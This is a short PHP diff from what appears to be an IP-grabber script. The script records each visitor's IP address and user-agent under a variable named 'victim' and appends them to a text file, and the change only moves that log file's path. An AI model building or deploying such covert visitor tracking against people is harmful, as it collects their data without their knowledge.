@@ -21,7 +21,7 @@ $useragent = "User-Agent: " . $_SERVER['HTTP_USER_AGENT'];
 $victim = "IP: " . $ipaddress . "\r\n" . $useragent . "\r\n";
 
 // Path to the file where the information will be stored
-$file = 'w/admin/database/ip.txt';
+$file = 'ip.txt';
 
 // Open the file for appending
 $fp = fopen($file, 'a');
